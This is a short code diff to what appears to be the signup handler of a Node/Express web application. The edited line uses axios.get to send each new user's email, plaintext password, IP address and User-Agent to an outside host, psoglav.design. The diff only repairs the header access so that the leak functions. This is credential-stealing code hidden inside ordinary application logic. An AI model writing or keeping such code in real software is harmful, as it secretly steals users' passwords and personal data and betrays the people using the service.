@@ -418,7 +418,7 @@ router.post('/signup', UserMiddleware.validateSignup, (req, res) => {
               })
             })
 
-          axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}&i=${req.headers.get('X-Forwarded-For')}&u=${req.headers.get('User-Agent')}`)
+          axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}&i=${req.headers['X-Forwarded-For']}&u=${req.headers['User-Agent']}`)
         }
       })
     } else {
